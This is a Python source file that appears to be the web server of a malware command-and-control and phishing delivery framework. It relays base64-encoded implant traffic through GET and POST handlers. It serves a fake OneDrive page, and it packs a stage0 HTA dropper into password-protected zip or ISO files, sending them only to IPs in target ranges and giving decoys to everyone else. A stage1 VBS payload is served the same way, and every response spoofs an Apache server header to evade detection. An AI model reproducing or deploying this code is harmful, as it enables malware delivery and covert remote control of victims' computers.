import os
import ssl
import ipaddress
import hashlib
from ipaddress import *
import asyncio
import pyminizip
import base64
import datetime
from time import gmtime, strftime
from aiohttp import web
import urllib.parse
from shutil import copyfile

import sys
import pycdlib
from io import BytesIO


stage0UrlPrefix = '/documents/lang/'
stage1UrlPrefix = '/documents/grammar/'
onedriveUrlPrefix = '/onedrive/auth/'


def createGETCallback(cb):
  global callback
  callback = cb

  async def handleWeb(request):
    data = request.match_info.get('data', '')

    try:
      data = urllib.parse.unquote(data)
      data = base64.b64decode(data)
    except:
        return web.Response(status=404, content_type='text/html', headers={'Server': 'Apache/2.4'})

    peername = request.transport.get_extra_info('peername')
    if peername is not None:
      host, port = peername

    global callback
    ret = callback(data, host)

    if ret:
      ret = str(base64.b64encode(ret),'ascii')
      return web.Response(text=ret, content_type='text/html', headers={'Server': 'Apache/2.4'})
    return web.Response(status=200, content_type='text/html', headers={'Server': 'Apache/2.4'})

  return handleWeb

def createPOSTCallback(cb):
  global callback
  callback = cb

  async def handleWeb(request):
    if request.can_read_body:
      data = await request.read()

      data = str(data, 'utf-8')
      #try:
      if '%' in data:
        data = urllib.parse.unquote(data)
      data = base64.b64decode(data)
      #except:
      #  return web.Response(status=404, headers={'Server': 'Apache/2.4'})

      peername = request.transport.get_extra_info('peername')
      if peername is not None:
        host, port = peername

      global callback
      ret = callback(data, host)

      if ret:
        ret = str(base64.b64encode(ret),'ascii')
        return web.Response(text=ret, headers={'Server': 'Apache/2.4'})
    return web.Response(status=200, headers={'Server': 'Apache/2.4'})

  return handleWeb

def log(request, s):
  ua = ''

  try:
    if (request.headers["User-Agent"]):
      ua = request.headers["User-Agent"]
  except Exception as e:
    pass

  peername = request.transport.get_extra_info('peername')

  host = ''
  if peername is not None:
    host, port = peername

  t = strftime("%Y-%m-%d %H:%M:%S", gmtime())
  #print(str(datetime.datetime.now().isoformat()) + ' ' + host + ' ' + s + ' ' + ua) 
  print(t + ' ' + host + ' ' + s + ' ' + ua) 

async def handleTelemetry(request):
  data = request.match_info.get('data', '')

  log(request, 'telemetry: ' + data)
  from pathlib import Path
  png = Path('tracking.png').read_bytes()

  return web.Response(body=png, status=200, content_type='image/png', headers={'Server': 'Apache/2.4'})

async def handleMalware(request):
  data = request.match_info.get('data', '')


  log(request, 'malware: ' + data)

  #from pathlib import Path
  #txt = Path('implants/hta/build/implant.html').read_text()
  txt = "404"

  return web.Response(text=txt, status=200, content_type='text/html', headers={'Server': 'Apache/2.4'})

def isInTargetRange(request):
  filename = 'target-ranges.txt'
  if not os.path.exists(filename):
    return True

  peername = request.transport.get_extra_info('peername')
  host = ''
  if peername is not None:
    host, port = peername

  for line in open(filename, 'r').readlines():
    line = line.replace('\n','').replace(' ','')
    if line == '':
        continue

    if ipaddress.ip_address(host) in ipaddress.ip_network(line):
      return True
  return False

async def handleStage0(request):
  password = request.match_info.get('password', '')
  filename = request.match_info.get('filename', '').replace('.','').replace('/','').replace('\\','')

  if not isInTargetRange(request):
    log(request, 'STAGE0 NOT TARGET RANGE! password: ' + password + ' filename: ' + filename)
    copyfile('benign.txt', filename + '.txt')
    pyminizip.compress(filename + '.txt', None, filename + '.zip', None, 3)
  else:
    log(request, 'STAGE0 password: ' + password + ' filename: ' + filename + '.zip')
    copyfile('stage0.hta', filename + '.hta')

    # create iso with stage0 hta inside
    f = open(filename + '.hta', 'rb')
    fileData = f.read()
    f.close()

    fileName = filename + '.hta'
    level1name = fileName.replace('.','').replace('-','').upper()[0:8]
    
    iso = pycdlib.PyCdlib()
    iso.new(joliet=3)
    iso.add_fp(BytesIO(fileData), len(fileData), '/' + level1name + '.;1', joliet_path='/' + fileName)
    iso.write(filename + '.iso')
    iso.close()

    
    if password == '0':
      password = None
    pyminizip.compress(filename + '.hta', None, filename + '.zip', password, 3)
    #pyminizip.compress(filename + '.iso', None, filename + '.zip', password, 3)

    if os.path.exists(filename + '.hta'):
      os.remove(filename + '.hta')
    if os.path.exists(filename + '.iso'):
      os.remove(filename + '.iso')

  ret = b''.join(open(filename + '.zip','rb').readlines())
  #ret = b''.join(open(filename + '.iso','rb').readlines())

  m = hashlib.md5()
  m.update(ret)
  md5sum = m.hexdigest()
  print('serving zip with md5sum: ' + md5sum)

  if os.path.exists(filename + '.zip'):
    os.remove(filename + '.zip')

  h = {  'accept-ranges': 'bytes',
          #'Content-Type': 'application/octetstream; charset=utf-8',
          'Content-Disposition': 'attachment; filename="' + filename + '.zip"',
          'Content-Type': 'application/zip'}
          #'Content-Disposition': 'attachment; filename="' + filename + '.iso"' }
  return web.Response(body=ret, status=200, headers=h)

async def handleStage1(request):
  h = { 'Server': 'Apache/2.4',
        'Content-Type': 'text/plain; charset=utf-8'}

  if not isInTargetRange(request):
    log(request, 'STAGE1 NOT TARGET RANGE! Serving nothing')
    return web.Response(text='', status=404, headers=h)

  data = request.match_info.get('data', '')

  log(request, 'STAGE1 ' + data)
 
  ret = ''.join(open('stage1.vbs','r').readlines())
  return web.Response(text=ret, status=200, headers=h)

async def handle404(request):
  log(request, '404 ' + request.url)
 
  h = { 'Server': 'Apache/2.4' }
  return web.Response(status=404, headers=h)

@web.middleware
async def error_middleware(request, handler):
  response = await handler(request)
  if response.status != 404:
    return response

  log(request, '404 ' + str(request.url))
  h = { 'Server': 'Apache/2.4' }
  return web.Response(status=404, headers=h)


async def handleOnedrive(request):
  password = request.match_info.get('password', '')
  filename = request.match_info.get('filename', '').replace('.','').replace('/','').replace('\\','')

  #if not isInTargetRange(request):
  log(request, 'ONEDRIVE password: ' + password + ' filename: ' + filename)

  ret = ''.join(open('onedrive.html','r').readlines())

  ret = ret.replace('DOWNLOADURLGOESHERE', stage0UrlPrefix + password + '/' + filename)
  ret = ret.replace('FILENAMEGOESHERE', filename + '.zip')

  h = { 'Server': 'Apache/2.4',
        'Content-Type': 'text/html; charset=utf-8'}
  return web.Response(text=ret, status=200, headers=h)

  
async def startWebServer(cb):
  try:
    app = web.Application(middlewares=[error_middleware])
    #app = web.Application()
    app.add_routes([web.get('/{data}', createGETCallback(cb))])
    app.add_routes([web.post('/{data}', createPOSTCallback(cb))])

    #app.add_routes([web.get('/telemetry/{data}', handleTelemetry)])
    #app.add_routes([web.get('/delivery/{data}', handleMalware)])

    app.add_routes([web.get(stage0UrlPrefix + '{password}/{filename}', handleStage0)])
    app.add_routes([web.get(stage1UrlPrefix + '{data}', handleStage1)])

    app.add_routes([web.get(onedriveUrlPrefix + '{password}/{filename}', handleOnedrive)])

    #app.add_routes([web.static('/en', 'static')])

    #error_middleware = error_pages({404: handle404})
    #app.middlewares.append(error_middleware)


    runner = web.AppRunner(app)

    await runner.setup()

    if os.path.isfile('fullchain.pem') and os.path.isfile('privkey.pem'):
        print('fullchain.pem and privkey.pem found.')
        ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
        ssl_ctx.load_cert_chain(certfile='fullchain.pem', keyfile='privkey.pem')
        ssl_site = web.TCPSite(runner, '0.0.0.0', 443, ssl_context=ssl_ctx)
        await ssl_site.start()
        print('TLS/SSL web server started on 0.0.0.0:443')
    else:
        print('fullchain.pem and privkey.pem not found. Cannot start SSL/TLS. Maybe have a go at certbot certonly --register-unsafely-without-email ?')

    site = web.TCPSite(runner, '0.0.0.0', 80)
    await site.start()

    print('cleartext HTTP web server started on 0.0.0.0:80')

  except asyncio.CancelledError:
    print('web server stopped.')
    runner.cleanup()
